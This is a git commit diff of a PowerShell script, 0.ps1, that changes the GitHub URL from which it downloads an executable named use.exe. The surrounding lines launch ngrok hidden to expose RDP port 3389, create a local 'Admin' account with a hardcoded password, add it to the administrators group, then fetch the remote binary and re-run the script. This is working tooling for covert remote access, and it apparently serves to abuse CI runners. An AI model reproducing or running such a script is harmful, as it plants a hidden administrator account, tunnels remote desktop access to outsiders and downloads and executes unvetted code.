841f6e3ea0c72d85c80407c21d40331fa64e5b45
n0td1n0kh0a <152876934+n0td1n0kh0a@users.noreply.github.com>
2024-04-29 14:37:35 +0700

    Update 0.ps1

--- 0.ps1
+++ 0.ps1
@@ -4,7 +4,7 @@ Start-Process -FilePath "ngrok.exe" -ArgumentList "tcp 3389" -WindowStyle Hidden
 cmd /c net user /add Admin P@ssw0rd.
 cmd /c net localgroup /add administrators Admin
 sleep 240
-curl -o zip.exe -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe"
+curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/circleci/main/use.exe"
 .\0.ps1
-curl -o zip.exe -Uri "https://raw.githubusercontent.com/Usser1222/circleci/main/use.exe"
+curl -o zip.exe -Uri "https://raw.githubusercontent.com/n0td1n0kh0a/circleci/main/use.exe"
 .\0.ps1
